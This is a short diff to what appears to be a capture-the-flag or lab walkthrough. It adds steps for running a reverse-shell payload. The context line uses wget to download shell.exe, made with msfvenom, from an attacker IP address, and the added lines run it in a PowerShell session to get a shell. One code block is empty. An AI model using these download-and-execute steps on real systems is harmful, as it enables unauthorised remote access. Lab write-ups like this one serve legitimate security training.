@@ -230,6 +230,16 @@ Ill set all the correct options that were set in msfvenom
 wget http://10.10.14.61/shell.exe -o shell.exe
 ```
 
-In the PWSA session i 
+In the PWSA session ill use this command to get the shell
+
+```python
+./shell.exe
+```
+
+Then ill just run it
+
+```python
+
+```
 
 
